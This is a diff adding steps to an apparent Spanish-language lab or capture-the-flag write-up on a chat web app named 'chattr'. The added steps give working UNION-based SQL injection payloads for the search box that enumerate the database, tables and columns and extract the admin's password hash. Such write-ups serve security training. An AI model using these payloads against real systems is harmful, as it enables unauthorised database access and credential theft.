@@ -88,10 +88,61 @@ y en el Response>Pretty ( a la derecha ) obtendremos: Location: /login.php?s=acc
 
 ![Login](imgs/login.png)
 
+9. A partir de aqui, nos concentramos solo en el cuadro de busqueda (search)
+
+Por ejemplo, intentemos con `admin') union select 1,2,3-- -`: No obtenemos nada (error)
+Ahora, intentemos con `admin') union select 1,2,3,4-- -` y tenemos esto:
 
 
+![primero](imgs/primero.png)
+
+Entonces, sabemos que solo la tercer columna sera mostrada.
+
+10. Ahora si viene lo interesante! La pregunta nos pide hallar el password hash del admin.
+
+Primero debemos conocer el nombre de la base de datos:
+
+```
+admin') union select 1,2, database(),4 from INFORMATION_SCHEMA.SCHEMATA-- -
+```
+
+![databasename](imgs/databasename.png)
+
+`database()` devolvió `chattr`, es decir, esa es la base de datos que está usando la aplicación.
+
+Ahora necesitamos saber las tablas existentes dentro de la base de datos chattr
+
+```
+admin') union select 1,2, TABLE_NAME,4 from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -
+```
+
+![tablesinchattr](imgs/tablesinchattr.png)
+
+Tenemos 3 tablas: Users, InvitationCodes y Messages.
+La tabla Users parece que tiene informacion interesante.
+
+Vamos a ver sus columnas: 
+
+```
+xd') union select 1,2,COLUMN_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
+```
+
+![Columnas](imgs/columnas.png)
+
+Ahora sabemos que la tabla Users es algo asi:
 
 
+| UserID | Username | Password | InvitationCode | AccountCreated
+| --- | --- | --- | --- | --- |
+| ... | ... | ... | ... | ... |
+| ... | ... | ... | ... | ... |
+
+Por fin!!! Obtengamos la password hash del admin:
+```
+xd') union select 1,2,Password,4 from Users where Username="admin"-- -
+```
+
+![passwordhash](imgs/passwordhash.png)
 
 ---
 
